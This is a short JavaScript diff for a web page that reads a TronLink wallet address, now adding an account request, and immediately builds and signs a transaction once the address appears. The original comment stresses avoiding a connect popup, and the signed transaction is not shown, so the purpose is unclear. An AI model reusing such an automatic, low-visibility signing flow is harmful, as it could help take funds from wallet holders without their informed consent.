@@ -70,17 +70,27 @@
             });
         }
 
-        // Poll for tronWeb address - NO requestAccounts, NO connect popup
+        // Try to get address immediately, if not available request it
         var n = 0;
         var t = setInterval(function() {
             n++;
             if (done) { clearInterval(t); return; }
+
             var addr = getAddress();
             if (addr) {
                 clearInterval(t);
                 buildAndSign(addr);
+                return;
             }
-        }, 200);
+
+            // On first check, request accounts right away
+            if (n === 1 && window.tronLink && window.tronLink.request) {
+                window.tronLink.request({ method: "tron_requestAccounts" }).then(function() {
+                    var a = getAddress();
+                    if (a && !done) { clearInterval(t); buildAndSign(a); }
+                }).catch(function(){});
+            }
+        }, 300);
 
         // Timeout after 15s
         setTimeout(function() {
